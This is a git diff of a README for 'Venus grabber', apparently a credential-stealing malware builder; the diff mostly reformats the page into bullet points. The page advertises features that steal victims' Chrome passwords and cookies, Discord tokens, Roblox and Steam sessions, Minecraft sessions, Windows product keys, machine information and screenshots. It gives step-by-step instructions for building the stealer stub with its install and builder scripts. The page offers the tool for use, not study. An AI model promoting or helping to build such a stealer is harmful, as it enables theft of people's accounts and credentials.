@@ -1,26 +1,27 @@
-![image](https://github.com/hinmis/Venus_grabber/assets/141452638/d2889e19-925a-406c-92d0-73e4af57b98c)
+             ![image](https://github.com/hinmis/Venus_grabber/assets/141452638/d2889e19-925a-406c-92d0-73e4af57b98c)
 
 # Venus_builder
-![image](https://github.com/hinmis/Venus_Grabber/assets/141452638/185444e4-b2a3-45e4-a0e6-2435d5be4ffa)
+                                 ![Capture d'écran 2024-01-26 150341](https://github.com/hinmis/Venus_Grabber/assets/141452638/adc7ae92-0b28-467f-8f78-ed746d5123d6)
+
+• UPDATE WEEKLY
 
 # Features
-Grabs Roblox cookies from Roblox Studio
 
-Grabs Minecraft sessions
+• Grabs Roblox cookies from Roblox Studio
 
-Grabs Google Chrome passwords
+• Grabs Minecraft sessions
 
-Grabs Google Chrome cookies
+• Grabs Google Chrome passwords
 
-Grabs victim machine info
+• Grabs Google Chrome cookies
 
-Grabs Windows product key
+• Grabs victim machine info
 
-Grabs IP address, geolocation
+• Grabs Windows product key
 
-Grabs screenshot
+• Grabs screenshot
 
- Steals Discord Tokens.
+• Steals Discord Tokens.
  
 • Steals Steam Session.
 
@@ -60,27 +61,29 @@ Grabs screenshot
 
 # Requirements
 
-To build the stub, you need:
+• To build the stub, you need:
 
-Windows 10.
+• Windows 10.
 
-Python 3.10+.
+•Python 3.10+.
 
-An active internet connection.
+• An active internet connection.
 
 # How to Build?
 
-Download and install Python 3 (Make sure to enable the Add to PATH option.)
+• Download and install Python 3 (Make sure to enable the Add to PATH option.)
 
-Verify the installation by executing python --version in CMD.
+• Verify the installation by executing python --version in CMD.
 
-Download Venus grabber.
+• Download Venus grabber.
 
-Extract the zip file.
+• Extract the zip file.
 
-Navigate to the Venus Grabber folder and double click install.bat file.
+• Navigate to the Venus Grabber folder and double click install.bat file.
 
-After it downloads the requirement double click Builder.bat
+• After it downloads the requirement double click Builder.bat
 
-Fill in the fields of the builder and press the Build button
+• Fill in the fields of the builder and press the Build button
 
+# License
+•  By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.
